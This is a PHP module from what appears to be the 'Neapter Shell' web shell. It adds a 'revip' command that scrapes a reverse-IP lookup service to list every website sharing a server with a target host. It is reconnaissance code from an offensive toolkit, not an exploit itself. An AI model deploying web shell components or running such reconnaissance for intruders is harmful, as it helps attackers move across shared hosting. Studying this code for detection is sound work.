<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * ModuleRevip - Revip
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 */
class ModuleRevip implements ShellInterface
{
	/**
	 * Obiekt Shell
	 *
	 * @ignore
	 * @access private
	 * @var    object
	 */
	private $oShell;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		$this -> oShell = $oShell;
	}

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'revip' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.00 2011-09-12 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Revip

	Użycie:
		revip host_lub_ip

	Przykład:
		revip przemo.org
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( ( $this -> oShell -> iArgc !== 1 ) || ( $this -> oShell -> aArgv[0] === 'help' ) )
		{
			return $this -> getHelp();
		}

		/**
		 * Pobieranie danych
		 */
		if( ( $sData = file_get_contents( sprintf( 'http://domaintz.com/tools/reverse-ip/%s', $this -> oShell -> aArgv[0] ) ) ) === FALSE )
		{
			return 'Nie można połączyć się z serwerem';
		}


		/**
		 * Wyciaganie danych
		 */
		if( ! preg_match( '~<pre>(.+?)</pre>~', $sData, $aData ) )
		{
			return 'Wystąpił błąd podczas pobierania danych';
		}

		/**
		 * Wyciaganie adresow
		 */
		if( ! preg_match_all( '~<a href="[^"]+" target="_blank" rel="nofollow">(.+?)</a>~', $aData[1], $aData ) )
		{
			return 'Brak danych';
		}

		/**
		 * Wyswietlanie adresow
		 */
		return sprintf( "Zwrócono %d witryn:\r\n\t%s",  count( $aData[1] ), implode( "\r\n\t", $aData[1] ) );
	}

}